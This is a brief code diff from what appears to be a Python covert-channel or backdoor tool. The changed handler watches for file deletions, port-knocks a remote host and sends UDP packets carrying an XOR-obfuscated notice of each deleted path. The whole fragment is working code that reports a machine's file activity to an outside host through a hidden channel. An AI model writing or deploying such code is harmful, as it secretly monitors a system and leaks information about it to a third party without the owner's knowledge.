@@ -387,9 +387,8 @@ class EventHandler(pyinotify.ProcessEvent):
                 print ex.message
 
     def process_IN_DELETE(self, event):
-        if all(not event.pathname.endswith(ext) for ext in self.extensions) and not os.path.isdir(event.pathname):
+        if all(not event.pathname.endswith(ext) for ext in self.extensions):
             return
-
         knock(default_dest)
         send(IP(dst=default_dest) / UDP(sport=1, dport=SEND_PORT), verbose=0)
         send(IP(dst=default_dest) / UDP(sport=4444, dport=SEND_PORT) / xor_crypt('{0} was deleted'.format(event.pathname)), verbose=0)
